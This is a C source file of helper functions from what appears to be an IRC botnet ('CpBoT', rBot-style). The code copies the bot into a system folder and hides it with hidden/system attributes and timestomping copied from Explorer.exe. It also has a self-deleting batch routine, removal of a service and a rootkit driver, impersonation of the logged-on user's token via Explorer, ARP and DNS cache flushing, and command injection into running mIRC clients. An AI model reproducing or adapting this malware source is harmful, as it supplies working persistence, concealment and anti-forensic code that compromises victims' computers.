//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//

#include "includes.h"
#include "functions.h"

int SplitParams(char *a[MAX_TOKENS],char *line,int depth)
{
	a[0]=strtok(line," ");
	int i;
	for (i=1;i<depth;i++)
	{
		a[i]=strtok(NULL," ");
		if (a[i])
			continue;
		else
			break;
	}
	return i;
}

//http://www.nirsoft.net/vc/isfileexist.html
BOOL FileExists(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else 
		return TRUE;
}

BOOL IsFolder(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else 
	{
		if (dwAttr & FILE_ATTRIBUTE_DIRECTORY)
			return TRUE;
		else
			return FALSE;
	}
}

// File size function from OmegaII
size_t FileSize(const char *filename)
{
	unsigned short  multiplier=0, fread_ret=0, feof_ret=0;
	char char_count[1024];
	FILE *stream;

	stream = fopen(filename, "rb");
	while(fread_ret = fread(char_count, sizeof(char), sizeof(char_count), stream))
	{
		if (fread_ret < 1024)
		{
			feof_ret = feof(stream);
			if (feof_ret != 0)
				return (sizeof(char_count) * multiplier)+fread_ret;
			else
				return 0;
		}
		else
			multiplier++;
	}
	return (sizeof(char_count) * multiplier)+fread_ret;
}
/*
int FileSize(const char * szFileName) 
{ 
	struct stat fileStat; 
	int err = stat( szFileName, &fileStat ); 
	if (0 != err) return 0; 
	return fileStat.st_size; 
}
*/

BOOL SetFileTime(char *TargetFile)
{
	/*
		Gets the filetime of the computers shell file (usually Explorer.exe), from the registry
		and then sets the target file to the same filetime. The shell file, unless a custom one,
		should be the orignal date of the OS install; this is good for hiding your file when
		located in GetSystemDirectory().
			-SourceX
	*/
	HANDLE hShell;
	FILETIME ft;
	char cWindowsDir[MAX_PATH];
	char *cShellFile;

	GetWindowsDirectory(cWindowsDir,sizeof(cWindowsDir));
	cShellFile=RegQuery(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","Shell");
	if (cShellFile)
	{
		strcat(cWindowsDir,cShellFile);
		hShell=CreateFile(cWindowsDir,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

		if (hShell != INVALID_HANDLE_VALUE) 
		{
			GetFileTime(hShell,(LPFILETIME)NULL,(LPFILETIME)NULL,&ft);
			CloseHandle(hShell);
			hShell = CreateFile(TargetFile,GENERIC_WRITE,FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

			if (hShell != INVALID_HANDLE_VALUE) 
			{
				SetFileTime(hShell,(LPFILETIME)NULL,(LPFILETIME)NULL,&ft);
				CloseHandle(hShell);

				return TRUE;
			}
		}
	}
	return FALSE;
}

BOOL MoveBot(char *MoveToPath, char *Filename)
{
	char CurrentPath[MAX_PATH],CurrentPathF[MAX_PATH],MoveToPathF[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),CurrentPathF,sizeof(CurrentPathF));
	_snprintf(MoveToPathF,sizeof(MoveToPathF),"%s\\%s",MoveToPath,Filename);
	strcpy(CurrentPath,CurrentPathF);
	fPathRemoveFileSpec(CurrentPath);
	
#ifdef _DEBUG
		printf("MoveToPath:   %s\n"
			   "MoveToPathF:  %s\n"
			   "Filename:     %s\n"
			   "CurrentPath:  %s\n"
			   "CurrentPathF: %s\n",MoveToPath,MoveToPathF,Filename,CurrentPath,CurrentPathF);
#endif

	if (lstrcmpi(CurrentPathF,MoveToPathF))
	{

		if (GetFileAttributes(MoveToPathF) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		BOOL bCFRet=FALSE;
		while ((bCFRet=CopyFile(CurrentPathF,MoveToPathF,FALSE)) == FALSE)
		{
			DWORD result = GetLastError();

#ifdef _DEBUG
			printf("Couldn't copy file, error: %d.\n",result);
#endif

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED))
			{
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			}
			else
				break;
		}

		SetFileTime(MoveToPathF);
		SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
		
		if (bCFRet)
		{
#ifdef _DEBUG
			printf("Copied file.\n");
#endif
			return TRUE;
		}

	}
	else
	{
#ifdef _DEBUG
		printf("Don't need to copy.\n");
#endif
	}
	return FALSE;
}
char *substr(char *input, int start, int end)
{
	static char output[1024];
	//ZeroMemory(output,sizeof(output));
	
	for (int y=0;y<256;y++)
		output[y]='\0';
	
	for (int i=start,t=0;i<=end;i++,t++)
		output[t]=input[i];
	return (output);
}
char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty 
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string 
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found 
			strncpy(temps, str, ptr - str);     // Copy first part 
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	} 
	return ptr;
} 

#ifndef NO_WILDCARD
// Wildcard function(s) from: http://user.cs.tu-berlin.de/~schintke/references/wildcards/wildcards.c.html
int set(char **wildcard, char **test)
{
	int fit = 0, negation = 0, at_beginning = 1;

	if ('!' == **wildcard) {
		negation = 1;
		(*wildcard)++;
	}
	while ((']' != **wildcard) || (1 == at_beginning)) {
		if (0 == fit) {
			if (('-' == **wildcard) && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
				&& (']' != *(*wildcard + 1)) && (0 == at_beginning)) {
				if (((**test) >= (*(*wildcard - 1))) && ((**test) <= (*(*wildcard + 1)))) {
					fit = 1;
					(*wildcard)++;
				}
			}
			else if ((**wildcard) == (**test))
              fit = 1;
		}
		(*wildcard)++;
		at_beginning = 0;
	}
	if (1 == negation)
		fit = 1 - fit;
	if (1 == fit) 
		(*test)++;

	return (fit);
}
int asterisk(char **wildcard, char **test)
{
	int fit = 1;

	(*wildcard)++; 
	while (('\000' != (**test)) && (('?' == **wildcard) || ('*' == **wildcard))) {
		if ('?' == **wildcard) 
			(*test)++;
		(*wildcard)++;
	}
	while ('*' == (**wildcard))
		(*wildcard)++;

	if (('\0' == (**test)) && ('\0' != (**wildcard)))
		return (fit = 0);
	if (('\0' == (**test)) && ('\0' == (**wildcard)))
		return (fit = 1); 
	else {
		if (0 == wildcardfit(*wildcard, (*test))) {
			do {
				(*test)++;
				while (((**wildcard) != (**test)) && ('['  != (**wildcard)) && ('\0' != (**test)))
					(*test)++;
			} while ((('\0' != **test))?(0 == wildcardfit ((char *)*wildcard, (*test))):(0 != (fit = 0)));
		}
		if (('\0' == **test) && ('\0' == **wildcard))
			fit = 1;
		return (fit);
	}
}
int wildcardfit(char *wildcard, char *test)
{
	int fit = 1;
  
	for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++) {
		switch (*wildcard) {
		//case '[':
		//	wildcard++;
		//	fit = set (&wildcard, &test);
		//	break;
		case '?':
			test++;
			break;
		case '*':
			fit = asterisk (&wildcard, &test);
			wildcard--;
			break;
		default:
			fit = (int) (*wildcard == *test);
			test++;
		}
	}
	while ((*wildcard == '*') && (1 == fit)) 
		wildcard++;

	return ((int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard)));
}
#endif // NO_WILDCARD


void EraseMe(BOOL nopause/*=FALSE*/)
{
	char buffer[1024], cfilename[MAX_PATH], batfile[MAX_PATH];
	HANDLE f;
	DWORD r;

	GetTempPath(sizeof(buffer), buffer);
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
	sprintf(batfile, "%s\\removeMe%i%i%i%i.bat",buffer,rand()%9,rand()%9,rand()%9,rand()%9);

	SetFileAttributes(cfilename,FILE_ATTRIBUTE_NORMAL);

	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close.
		// the ping is there to slow it down in case the file cant get erased,
		// dont wanna rape the cpu.
		char delBatch[512];
		if (!nopause)
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
	"del \"%s\">nul\r\n"
	"ping 0.0.0.0>nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cfilename,cfilename,cfilename);
		}
		else
		{
	sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
	"del \"%s\">nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cfilename,cfilename,cfilename);
		}
		
		WriteFile(f, delBatch, strlen(delBatch), &r, NULL);
		CloseHandle(f);

		// execute the batch file
		fShellExecute(NULL, NULL, batfile, NULL, NULL, SW_HIDE);
	}
	
	return;
}

#ifndef NO_FU
extern char ac_driverName[];
#endif
void uninstall(BOOL thread/*=FALSE*/, BOOL difbot/*=FALSE*/)
{
#ifndef NO_SERVICE
	// Erase the service
	SC_HANDLE scm;
	SC_HANDLE service;
	scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	service = fOpenService(scm, servicename, SERVICE_ALL_ACCESS);
	fDeleteService(service);
#else
	RegDelete(runkey.hkey,runkey.subkey,runkey.name);
#endif

	if (difbot)
	{
	}
	
#ifndef NO_FU
	DeleteFile(ac_driverName);
#endif
	
	ReleaseMutex(mutex); // release the mutex so it doesn't break the next bot if it uses the same one

	if (!thread)
	{ // ^ so we don't kill the update thread or have the batch trying to erase the new bot

		// kill all threads
		killthreadall();
		// start the batch to erase the bot
		EraseMe();
	}
	return;
}

HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter)
{
	DWORD Thread_Id;
	return(CreateThread(NULL,NULL,XThread_Function,Parameter,NULL,&Thread_Id));
}

char *commaI64(unsigned __int64 number)
{
	int counter = 0;

	static char str[50];
	ZeroMemory(str,sizeof(str));

	char tempStr[50];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return str;
}

char *commaI64(unsigned __int64 number, char *str)
{
	int counter = 0;
	char tempStr[50];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return str;
}

#ifndef NO_FLUSHDNS
BOOL FlushDNSCache(void)
{
	BOOL bRet = FALSE;
	if (fDnsFlushResolverCache)
		bRet=fDnsFlushResolverCache();
	return bRet;
}
#endif

#ifndef NO_FLUSHARP
BOOL FlushARPCache(void)
{
    PMIB_IPNETTABLE arp = 0;
    ULONG tsize = 0;
	BOOL bRet = TRUE;
	
    DWORD result = fGetIpNetTable(NULL, &tsize, TRUE);
	switch(result) {
	case ERROR_SUCCESS:
		break;
	case ERROR_INSUFFICIENT_BUFFER:
		arp=(PMIB_IPNETTABLE)malloc(tsize);
		ZeroMemory((LPVOID)arp,tsize);

		if (arp != NULL) {
			if ((result = fGetIpNetTable(arp, &tsize, TRUE)) != ERROR_SUCCESS) {
				bRet = FALSE;
			}
		} else {
			bRet = FALSE;
		}
		break;
	case ERROR_NO_DATA:
		bRet = FALSE;
		break;
	case ERROR_NOT_SUPPORTED:
		bRet = FALSE;
		break;
	default:
		bRet = FALSE;
	}

	if (bRet) {
	    for (unsigned int i = 0; i < arp->dwNumEntries; i++)
			fDeleteIpNetEntry(&arp->table[i]);
	}
	free(arp);

	return bRet;
}
#endif

#ifndef NO_SERVICE
DWORD GetExplorerProcessID(void)
{
	HANDLE hProcess;
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	DWORD Explorer;
	unsigned int i;
	char szProcessName[MAX_PATH];
	HMODULE hMod;
	BOOL success = FALSE;

	if (!fEnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		return 0;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++) {
		strcpy(szProcessName, "unknown");
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,FALSE,aProcesses[i]);
		if (NULL != hProcess) {
			if (fEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				fGetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				if (lstrcmpi("Explorer.exe", szProcessName) == 0) {
					Explorer = aProcesses[i];
					i = cProcesses;
					return Explorer;
				}
			}
		}
	}
	return 0;
}

void ImpersonateInteractiveUser(void)
{
	HANDLE hToken=NULL;                
	HANDLE hProcess=NULL;
	DWORD processID=GetExplorerProcessID();
	if(processID)
	{
		hProcess=OpenProcess(PROCESS_ALL_ACCESS,TRUE,processID);
		if (hProcess)
		{
			if (fOpenProcessToken(hProcess,TOKEN_QUERY|TOKEN_DUPLICATE,&hToken))
			{
				fImpersonateLoggedOnUser(hToken);
				CloseHandle(hToken);
			}
			CloseHandle(hProcess);
		}
	}
}
#endif

#ifndef NO_MIRCCMD //taken from sp0rkeh
BOOL bMircSent;
BOOL CALLBACK mirc(HWND hWnd, LPARAM param)
{
	HANDLE hFileMap;
	char *mData;
	char wClass[512];

	GetClassName(hWnd, wClass, 512);
	if(!strcmpi(wClass, "mIRC"))
	{
		hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, "mIRC");
		mData = (char *)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

		wsprintf(mData, "%s", param);
		SendMessage(hWnd, (WM_USER + 200), 1, 0);

		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);
		bMircSent=TRUE;
	}

	return TRUE;
}

BOOL CALLBACK mirc32(HWND hWnd, LPARAM param)
{
	HANDLE hFileMap;
	char *mData;
	char wClass[512];

	GetClassName(hWnd, wClass, 512);
	if(!strcmpi(wClass, "mIRC32"))
	{
		hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, "mIRC32");
		mData = (char *)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

		wsprintf(mData, "%s", param);
		SendMessage(hWnd, (WM_USER + 200), 1, 0);

		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);
		bMircSent=TRUE;
	}

	return TRUE;
}

// any command or string sent in SendIrcCommand is sent to all instances of mIRC
BOOL SendIrcCommand(const char *str)
{
	bMircSent=FALSE;
	fEnumWindows((WNDENUMPROC)mirc, (LPARAM)str);
	fEnumWindows((WNDENUMPROC)mirc32, (LPARAM)str);
	return bMircSent;
}
#endif 

BOOL IsServiceRunning(char *name)
{
	ENUM_SERVICE_STATUS enumeration[10];
	DWORD bytesneeded, servicesreturned, resumehandle = 0;
	
	SC_HANDLE handle = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	
	while (fEnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
		sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
		GetLastError() == ERROR_MORE_DATA)
	{
		for (int i=0; i < (int)servicesreturned; i++) {
			if (!strcmp(enumeration[i].lpServiceName,name))
			{
				if (enumeration[i].ServiceStatus.dwCurrentState != SERVICE_RUNNING)
				{
					return FALSE;
				}
				else
					return TRUE;
			}
		}
		if (resumehandle == 0)
			break;
	}
	fCloseServiceHandle(handle); 
	return FALSE;
}

// Simple function to remove a complete directory
// on NT5 computers (the directory has to be empty,
// this function deletes all child elements 
// recursively.)
// (C) by rattle
// .aware security research
// http://www.awarenetwork.org/
void RemoveCompleteDirectory(char* path)
{
    RemoveDirectory(path);
	
    WIN32_FIND_DATA find; HANDLE hndle;
    char *strFindFiles = (char*) malloc(sizeof(char)*(strlen(path)+4));
    strcpy(strFindFiles,path);
    strcat(strFindFiles,"\\*.*");
    hndle = FindFirstFile(strFindFiles,&find);
	
    while (hndle != INVALID_HANDLE_VALUE) 
    {    
        char *strFolderItem = (char*) malloc(sizeof(char) * (strlen(path)+strlen(find.cFileName)+1));
        strcpy(strFolderItem,path);
        strcat(strFolderItem,"\\");
        strcat(strFolderItem,find.cFileName);
		
        if ((!strcmp(find.cFileName,"."))||(!strcmp(find.cFileName,".."))) 
        {
            RemoveDirectory(strFolderItem);
			
            if (FindNextFile(hndle,&find)) {
                continue;}
			
            else {
                RemoveDirectory(path);
                break; }
        }
		
        if (find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {    
            RemoveCompleteDirectory(strFolderItem);    }
        
        else {
            SetFileAttributes(strFolderItem,FILE_ATTRIBUTE_NORMAL);
            DeleteFile(strFolderItem);}
		
        if (FindNextFile(hndle,&find)) continue;
        else break;
    }
	
    FindClose(hndle);
    SetFileAttributes(path,FILE_ATTRIBUTE_DIRECTORY);
    RemoveDirectory(path);
}





